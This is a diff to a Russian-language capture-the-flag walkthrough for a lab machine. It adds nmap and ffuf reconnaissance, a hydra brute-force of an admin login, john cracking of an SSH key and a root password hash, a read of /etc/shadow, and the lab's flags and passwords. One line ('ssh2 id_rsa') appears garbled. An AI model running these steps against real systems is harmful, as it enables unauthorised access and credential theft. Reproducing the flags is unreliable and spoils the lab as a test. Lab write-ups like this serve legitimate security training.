@@ -23,6 +23,9 @@
 Поиск открытых портов с помощью nmap.
 Сколько портов открыто?
 ```commandline
+nmap -sC -sV -oN nmap/initial 10.10.204.93
+```
+```commandline
 2
 ```
 Какая версия SSH используется?
@@ -39,7 +42,10 @@ Ubuntu
 ```
 Поиск скрытых каталогов на веб-сервере.
 Что такое скрытый каталог?
-
+```commandline
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://10.10.204.93:80/FUZZ
+# http://10.10.204.93/admin
+```
 ```commandline
 /admin
 ```
@@ -50,18 +56,30 @@ Ubuntu
 ### Ответьте на вопросы ниже
 Какой у вас пользователь:пароль панели администратора?
 ```commandline
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.94.46 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+```
+```commandline
 admin:xavier
 ```
 Взломайте ключ RSA, который вы нашли.
 Какова парольная фраза закрытого ключа RSA Джона?
 ```commandline
+ssh2 id_rsa > RSAkey.txt
+john RSAkey.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+```commandline
 rockinroll
 ```
 пользователь.txt
 ```commandline
+chmod 600 id_rsa
+ssh -i id_rsa john@10.10.204.93
+```
+```commandline
 THM{a_password_is_not_a_barrier}
 ```
 Веб-флаг
+
 ```commandline
 THM{brut3_f0rce_is_e4sy}
 ```
@@ -72,9 +90,19 @@ THM{brut3_f0rce_is_e4sy}
 Найдите форму для повышения привилегий.
 Какой пароль root?
 ```commandline
+sudo -l
+cat /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt roothash.txt
+```
+```commandline
 football
 ```
 корень.txt
+```commandline
+su root
+cd /root
+cat root.txt
+```
 ```commandline
 THM{pr1v1l3g3_3sc4l4t10n}
 ```
